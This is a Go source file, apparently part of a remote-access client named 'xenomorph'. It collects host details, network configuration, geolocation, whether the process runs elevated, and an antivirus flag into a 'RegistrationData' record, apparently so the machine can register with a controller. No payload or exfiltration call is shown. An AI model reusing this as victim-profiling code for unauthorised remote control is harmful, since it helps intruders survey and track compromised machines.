package system

import (
	"os"
	"runtime"

	"github.com/codevault-llc/xenomorph/internal/netclient/services/network"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"github.com/codevault-llc/xenomorph/pkg/utils"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

func GetSystemInfo() types.RegistrationData {
	hostname, _ := os.Hostname()
	hostInfo, _ := host.Info()
	vmem, _ := mem.VirtualMemory()

	return types.RegistrationData{
		ComputerName: hostname,
		OS:           runtime.GOOS,
		OSVersion:    hostInfo.PlatformVersion,
		UUID:         GetUUID(),
		TotalMemory:  int64(vmem.Total),
		Uptime:       int64(hostInfo.Uptime),
		CPUModel:     GetCPUModel(),
		GPUModel:     GetGPUModel(),
		UAC:          utils.IsRunningElevated(),
		Antivirus:    false,
	}
}

func GetCPUModel() string {
	info, err := cpu.Info()
	if err != nil || len(info) == 0 {
		return "Unknown CPU"
	}

	return info[0].ModelName
}

func Info() types.RegistrationData {
	info := GetSystemInfo()
	geographic, err := network.GetGeographicLocation()
	if err != nil {
		geographic = types.Geographic{
			IP:         info.IPAddress,
			Hostname:   info.ComputerName,
			City:       "Unknown",
			Region:     "Unknown",
			Country:    "Unknown",
			Loc:        "Unknown",
			Org:        "Unknown",
			PostalCode: "Unknown",
			Timezone:   "Unknown",
		}
	}

	info.Geographic = geographic
	
	info.IPAddress, _ = network.GetLocalIP()
	info.MACAddress, _ = network.GetMacAddress()
	
	dns, _ := network.GetDNSInfo()
	info.DNS = dns
	info.Apps = []types.Application{}
	
	subnetMask, _ := network.GetSubnetMask()
	info.SubnetMask = subnetMask

	gateway, err := network.GetDefaultGateway()
	if err != nil {
		info.Gateway = "Unknown"
	} else {
		info.Gateway = gateway
	}

	interfaces, err := network.GetNetworkInterfaces()
	if err != nil {
		info.NetworkInterfaces = []types.NetworkInterface{}
	} else {
		info.NetworkInterfaces = interfaces
	}

	info.Disks, _ = GetDisks()

	return info
}